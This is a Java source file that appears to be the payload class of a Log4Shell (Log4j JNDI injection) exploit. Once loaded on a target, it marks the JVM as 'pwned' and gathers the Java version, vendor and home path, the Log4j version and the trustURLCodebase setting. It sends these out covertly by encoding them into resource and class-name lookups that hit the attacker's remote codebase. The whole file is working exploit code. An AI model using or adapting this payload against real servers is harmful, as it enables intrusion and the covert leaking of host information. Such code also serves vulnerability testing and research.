package itzbenz.payload;


import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;

public class General {
    static boolean init = false;
    
    
    public static void log(String str) {
        //disable this
        System.out.println(str);
        System.err.println(str);
        httpViaClasspath(str);
        try {
            LogManager.getLogger("java.lang.System").log(Level.FATAL, str);
        } catch (Throwable ignored) {

        }
    }

    public static void httpViaClasspath(String str) {
        //url encode the string
        try {
            String ur = "/information/" + str;
            General.class.getResource(ur);
            return;
        } catch (Throwable ignored) {
        }
        try {
            str = str.replace(' ', '.');
            //remove non-alphanumeric characters except for .
            str = str.replaceAll("[^a-zA-Z0-9\\.]", "");
            //remove . at the end
            while (str.endsWith(".")) str = str.substring(0, str.length() - 1);
            //remove . at the beginning
            while (str.startsWith(".")) str = str.substring(1);
            //remove consecutive .
            str = str.replaceAll("\\.+", ".");
            str = "information." + str;
            Class.forName(str);
        } catch (Throwable ignored) {

        }
    }

    public static void init() {
        if (init) return;
        init = true;
        try {
            Class.forName("itzbenz.Main");
            return;
        } catch (Throwable ignored) {

        }
        log("com.sun.jndi.ldap.object.trustURLCodebase: " +
                System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase"));

        if (System.getProperty("pwned") == null) {
            System.setProperty("pwned", "true");
        }
        try {
            LogManager.class.getCanonicalName();
        } catch (Throwable ignored) {
            log("Log4J not found");
        }
        try {
            org.apache.logging.log4j.core.lookup.JndiLookup.class.getCanonicalName();
        } catch (Throwable ignored) {
            log("JndiLookup not found");
        }
        try {
            String version = LogManager.class.getPackage().getImplementationVersion();
            log("Using Log4J version: " + version);
        } catch (Throwable ignored) {
        }
        log("Java version: " + System.getProperty("java.version"));
        log("Java vendor: " + System.getProperty("java.vendor"));
        log("Java home: " + System.getProperty("java.home"));
        log("Great Success!!!");
    }
}
